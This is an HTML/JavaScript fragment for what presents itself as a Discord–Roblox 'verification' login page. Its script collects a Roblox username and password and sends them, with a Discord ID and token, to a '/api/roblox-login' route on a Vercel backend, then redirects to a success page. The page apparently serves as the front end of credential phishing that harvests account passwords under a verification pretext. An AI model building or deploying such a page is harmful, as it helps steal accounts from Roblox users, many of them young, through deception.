<!DOCTYPE html>
<!-- Same HTML structure as before, just update the JavaScript -->
<script>
  async function handleLogin(event) {
    event.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    
    if (!username || !password) {
      alert('Please enter both username and password');
      return;
    }
    
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    try {
      // Send to Vercel API route
      const response = await fetch('/api/roblox-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username, 
          password, 
          discordId: urlParams.get('discord_id'),
          token: urlParams.get('token')
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        // Store data
        localStorage.setItem('roblox_username', data.robloxUsername);
        localStorage.setItem('roblox_userid', data.robloxId);
        localStorage.setItem('verification_token', data.verificationToken);
        
        // Redirect to success page
        setTimeout(() => {
          window.location.href = `verification-success.html?username=${encodeURIComponent(data.robloxUsername)}&userid=${data.robloxId}`;
        }, 1000);
      } else {
        throw new Error(data.error || 'Verification failed');
      }
      
    } catch (error) {
      console.error('Login error:', error);
      alert('An error occurred. Please try again.');
      document.getElementById('loadingOverlay').style.display = 'none';
    }
  }
</script>
